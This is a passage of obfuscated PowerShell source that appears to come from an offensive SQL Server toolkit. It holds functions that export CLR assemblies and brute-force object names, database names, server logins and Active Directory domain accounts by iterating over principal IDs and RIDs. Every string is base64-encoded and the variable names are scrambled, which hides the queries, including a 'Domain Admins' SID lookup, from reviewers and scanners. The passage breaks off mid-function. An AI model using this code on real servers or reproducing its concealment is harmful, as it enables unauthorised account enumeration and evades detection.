            ${/=\_/=\_/\_/\____} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_/=\_/\_/\____} |
            % -Process {
                $null = ${/==\_____/==\_/\/}.Rows.Add(
                    [string]$ComputerName,
                    [string]$Instance,
                    [string]${/====\/=\_/==\__/},
                    [string]$_.assembly_id,
                    [string]$_.assembly_name,
                    [string]$_.file_id,
                    [string]$_.file_name,
                    [string]$_.clr_name,
                    [string]$_.content,
                    [string]$_.permission_set_desc,
                    [string]$_.create_date,
                    [string]$_.modify_date,
                    [string]$_.is_user_defined)
                if($ExportFolder){
                    ${__/=\__/\___/====} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHgAcABvAHIAdABGAG8AbABkAGUAcgBcAEMATABSAEUAeABwAG8AcgB0AHMA')))
                    If ((test-path ${__/=\__/\___/====}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAZQB4AHAAbwByAHQAIABmAG8AbABkAGUAcgA6ACAAJAB7AF8AXwAvAD0AXABfAF8ALwBcAF8AXwBfAC8APQA9AD0APQB9AA==')))
                        $null = ni -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0AXABfAF8ALwBcAF8AXwBfAC8APQA9AD0APQB9AA=='))) -type directory
                    }  
                    ${___/\_____/\/==\_} = $Instance -replace('\\','_')
                    ${__/\__/=\/\__/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAD0AXABfAF8ALwBcAF8AXwBfAC8APQA9AD0APQB9AFwAJAB7AF8AXwBfAC8AXABfAF8AXwBfAF8ALwBcAC8APQA9AFwAXwB9AA==')))
                    If ((test-path ${__/\__/=\/\__/=\/}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAcwBlAHIAdgBlAHIAIABmAG8AbABkAGUAcgA6ACAAJAB7AF8AXwAvAFwAXwBfAC8APQBcAC8AXABfAF8ALwA9AFwALwB9AA==')))
                        $null = ni -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwBfAC8APQBcAC8AXABfAF8ALwA9AFwALwB9AA=='))) -type directory
                    }                   
                    ${_/=\___/=\__/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwBfAC8APQBcAC8AXABfAF8ALwA9AFwALwB9AFwAJAB7AC8APQA9AD0APQBcAC8APQBcAF8ALwA9AD0AXABfAF8ALwB9AA==')))
                    If ((test-path ${_/=\___/=\__/==\/}) -eq $False){
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAZABhAHQAYQBiAGEAcwBlACAAZgBvAGwAZABlAHIAOgAgACQAewBfAC8APQBcAF8AXwBfAC8APQBcAF8AXwAvAD0APQBcAC8AfQA=')))
                        $null = ni ${_/=\___/=\__/==\/} -type directory
                    } 
                    ${_/=\___/===\/==\_} = $_.file_name
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABpAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAeABwAG8AcgB0AGkAbgBnACAAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwB9AC4AZABsAGwA')))
                    ${/==\____/========} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwBfAF8ALwA9AFwAXwBfAC8APQA9AFwALwB9AFwAJAB7AF8ALwA9AFwAXwBfAF8ALwA9AD0APQBcAC8APQA9AFwAXwB9AC4AZABsAGwA')))
                    $_.content | sc -Encoding Byte ${/==\____/========}
                }                     
            }
        }
    }
    End
    {
        ${/==\_____/==\_/\/}
    }
}
Function  Get-SQLFuzzObjectName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${___/\_/\/=\_____/} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAbwBiAGoAZQBjAHQAcwAgAGYAcgBvAG0AIABvAGIAagBlAGMAdAAgAEkARABzAC4ALgAuAA==')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $StartId..$EndId |
        % -Process {
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAgACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAXwAnACAAYQBzACAAWwBPAGIAagBlAGMAdABJAGQAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABPAEIASgBFAEMAVABfAE4AQQBNAEUAKAAkAF8AKQAgAGEAcwAgAFsATwBiAGoAZQBjAHQATgBhAG0AZQBdAA==')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${_/==\_/\/==\____/} = ${/=\_____/\/\/=\__}.ObjectName
            if( -not $SuppressVerbose)
            {
                if(${_/==\_/\/==\____/}.length -ge 2)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE8AYgBqAGUAYwB0ACAASQBEACAAJABfACAAcgBlAHMAbwBsAHYAZQBkACAAdABvADoAIAAkAHsAXwAvAD0APQBcAF8ALwBcAC8APQA9AFwAXwBfAF8AXwAvAH0A')))
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE8AYgBqAGUAYwB0ACAASQBEACAAJABfACAAcgBlAHMAbwBsAHYAZQBkACAAdABvADoAIAA=')))
                }
            }
            ${___/\_/\/=\_____/} = ${___/\_/\/=\_____/} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${___/\_/\/=\_____/} | ? -FilterScript {
            $_.ObjectName.length -ge 2
        }
    }
}
Function  Get-SQLFuzzDatabaseName
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 1,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 300,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\/=\/\_/\/=\_/\} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAZABhAHQAYQBiAGEAcwBlACAAbgBhAG0AZQBzACAAZgByAG8AbQAgAGQAYQB0AGEAYgBhAHMAZQAgAEkARABzAC4ALgAuAA==')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $StartId..$EndId |
        % -Process {
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAgACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAXwAnACAAYQBzACAAWwBEAGEAdABhAGIAYQBzAGUASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABCAF8ATgBBAE0ARQAoACQAXwApACAAYQBzACAAWwBEAGEAdABhAGIAYQBzAGUATgBhAG0AZQBdAA==')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $DatabaseName = ${/=\_____/\/\/=\__}.DatabaseName
            if($DatabaseName.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEkARAAgACQAXwAgAC0AIABSAGUAcwBvAGwAdgBlAGQAIAB0AG8AOgAgACQARABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA')))
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEkARAAgACQAXwAgAC0AIABSAGUAcwBvAGwAdgBlAGQAIAB0AG8AOgA=')))
                }
            }
            ${/=\/=\/\_/\/=\_/\} = ${/=\/=\/\_/\/=\_/\} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${/=\/=\/\_/\/=\_/\} | ? -FilterScript {
            $_.DatabaseName.length -ge 2
        }
    }
}
Function  Get-SQLFuzzServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Try to determine if the principal type is role, SQL login, or Windows account via error analysis of sp_defaultdb.')]
        [switch]$GetPrincipalType,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${___/\/\/\_/\_/===} = New-Object -TypeName System.Data.DataTable
        $null = ${___/\/\/\_/\_/===}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${___/\/\/\_/\_/===}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${___/\/\/\_/\_/===}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAA=='))))
        $null = ${___/\/\/\_/\_/===}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABsAGUATgBhAG0AZQA='))))
        if($GetPrincipalType)
        {
            $null = ${___/\/\/\_/\_/===}.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABsAGUAVAB5AHAAZQA='))))
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMAIABmAHIAbwBtACAAJABGAHUAegB6AE4AdQBtACAAcAByAGkAbgBjAGkAcABhAGwAIABJAEQAcwAuAC4A')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABuACAAWwBQAHIAaQBuAGMAaQBwAGEAbABJAGQAXQAsACAAUwBVAFMARQBSAF8ATgBBAE0ARQAoAG4AKQAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABsAGUATgBhAG0AZQBdAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AIAAoACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAGwAZQBjAHQAIAB0AG8AcAAgACQARgB1AHoAegBOAHUAbQAgAHIAbwB3AF8AbgB1AG0AYgBlAHIAKAApACAAbwB2AGUAcgAoAG8AcgBkAGUAcgAgAGIAeQAgAHQAMQAuAG4AdQBtAGIAZQByACkAIABhAHMAIABOAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AIAAgACAAbQBhAHMAdABlAHIALgAuAHMAcAB0AF8AdgBhAGwAdQBlAHMAIAB0ADEAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMAcgBvAHMAcwAgAGoAbwBpAG4AIABtAGEAcwB0AGUAcgAuAC4AcwBwAHQAXwB2AGEAbAB1AGUAcwAgAHQAMgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAApACAAYQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGgAZQByAGUAIABTAFUAUwBFAFIAXwBOAEEATQBFACgAbgApACAAaQBzACAAbgBvAHQAIABuAHUAbABsAA==')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_____/\/\/=\__} |
        % {
            $PrincipalName = $_.PrincipleName
            ${__/==\_/==\_/=\__} = $_.PrincipalId
            if($GetPrincipalType)
            {
                ${_/\/===\__/\_/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgBzAHAAXwBkAGUAZgBhAHUAbAB0AGQAYgAgACcAJABQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlACcALAAgACcATgBPAFQAQQBSAEUAQQBMAEQAQQBUAEEAQgBBAFMARQAxADIAMwA0AEEAQgBDAEQAJwA=')))
                ${/====\_/=\_/=\___} = Get-SQLQuery -Instance $Instance -Query ${_/\/===\__/\_/=\/} -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -ReturnError
                if ((${/====\_/=\_/=\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBOAE8AVABBAFIARQBBAEwARABBAFQAQQBCAEEAUwBFACoA')))) -or (${/====\_/=\_/=\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGwAdABlAHIAIAB0AGgAZQAgAGwAbwBnAGkAbgAqAA==')))))
                {
                    if($PrincipalName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
                    {
                        ${/=\____/\_/\_/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEEAYwBjAG8AdQBuAHQA')))
                    }
                    else
                    {
                        ${/=\____/\_/\_/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABMAG8AZwBpAG4A')))
                    }
                }
                else
                {
                    ${/=\____/\_/\_/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAFIAbwBsAGUA')))
                }
            }
            if($GetPrincipalType)
            {
                $null = ${___/\/\/\_/\_/===}.Rows.Add($ComputerName, $Instance, ${__/==\_/==\_/=\__}, $PrincipalName, ${/=\____/\_/\_/\__})
            }
            else
            {
                $null = ${___/\/\/\_/\_/===}.Rows.Add($ComputerName, $Instance, ${__/==\_/==\_/=\__}, $PrincipalName)
            }
        }
    }
    End
    {
        ${___/\/\/\_/\_/===} | ? -FilterScript {
            $_.PrincipleName.length -ge 2
        }
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG0AcABsAGUAdABlAC4A')))
        }
    }
}
Function  Get-SQLFuzzDomainAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 500,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 1000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set a custom domain for user enumeration. Typically used to target trusted domains.')]
        [string]$Domain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/\_____/\_/==\___} = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))                
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        $Instance = ${_/==\_/==\___/\_/}.Instance
        if(-not $Domain){
            $Domain = ${_/==\_/==\___/\_/}.DomainName
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAGEAYwBjAG8AdQBuAHQAcwAgAGYAbwByACAAdABoAGUAIAAiACQARABvAG0AYQBpAG4AIgAgAGQAbwBtAGEAaQBuAC4ALgAuAA==')))        
        ${/====\/\/==\/=\__} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgBcAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMA')))         
        ${/=\_____/=\___/\/} = Get-SQLQuery -Instance $Instance -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGwAZQBjAHQAIABTAFUAUwBFAFIAXwBTAEkARAAoACcAJAB7AC8APQA9AD0APQBcAC8AXAAvAD0APQBcAC8APQBcAF8AXwB9ACcAKQAgAGEAcwAgAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABTAGkAZAA='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
        ${/=\/=\/=\/===\/\_} = ${/=\_____/=\___/\/} | select -Property domaingroupsid -ExpandProperty domaingroupsid       
        try{
            ${_____/=\___/\/\__} = [System.BitConverter]::ToString(${/=\/=\/=\/===\/\_}).Replace('-','').Substring(0,48)
        }catch{
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABwAHIAbwB2AGkAZABlAGQAIABkAG8AbQBhAGkAbgAgAGQAaQBkACAAbgBvAHQAIAByAGUAcwBvAGwAdgBlACAAYwBvAHIAcgBlAGMAdABsAHkALgA=')))
            return
        }
        $StartId..$EndId |
        % -Process {
            ${/==\/=\_/\__/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAeAB9AA=='))) -f $_
            ${_/===\/=\__/\/===} = ${/==\/=\_/\__/=\/\} | measure -Character
            ${/==\/=\_/=\_/\/=\} = ${_/===\/=\__/\/===}.Characters
            If([bool](${/==\/=\_/=\_/\/=\}%2))
            {
                ${__/\___/==\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAkAHsALwA9AD0AXAAvAD0AXABfAC8AXABfAF8ALwA9AFwALwBcAH0A')))
            }
            ${/=\____/=\/==\/=\} = ${__/\___/==\/\/\_/} -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))) | ? -FilterScript {
                $_
            }
            ${_/\/\_/=\____/=\_} = ${/=\____/=\/==\/=\} | sort -Descending
            ${__/\__/==\/=\___/} = ${_/\/\_/=\____/=\_} -join ''
            ${___/\_/\____/\__/} = ${__/\__/==\/=\___/}.PadRight(8,'0')
